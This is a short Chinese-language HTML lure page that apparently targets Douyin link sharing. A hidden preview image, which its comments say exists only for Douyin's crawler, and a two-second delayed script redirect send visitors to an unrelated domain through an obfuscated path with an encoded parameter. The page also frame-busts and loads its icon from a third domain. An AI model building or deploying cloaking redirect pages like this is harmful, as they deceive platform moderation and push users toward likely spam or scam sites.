<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- 抖音分享标题 -->
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>点击进入继续访问在线看资料</title>
    <link rel="shortcut icon" href="http://shprh0.lat/assets/img/favicon.ico">
    
 
    
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
        }
    </style>
</head>
<body>
    <!-- 隐藏的预览图，仅用于抖音抓取 -->
    <img src="./333.png" alt="预览图" style="display: none; position: absolute; left: -9999px; width: 1px; height: 1px;">
    
    <script>
        // 防止页面被嵌入iframe
        if (window.top !== window.self) {
            window.top.location = window.self.location;
        }
        
        // 延迟跳转，给抖音爬虫时间抓取
        setTimeout(function() {
            window.location.href = "http://qtjtec.com/template/default/images/index/temp/top.html?d=DxsAHxlTTkIOAkVBCxpPDgMBWgICBwQfSQwaQAVcEwADFkZAWTEMHA0pABsJRlBaUl9FWlpRUVxSW0ZBAh0MAQ%3D%3D";
        }, 2000);
    </script>
</body>
</html>
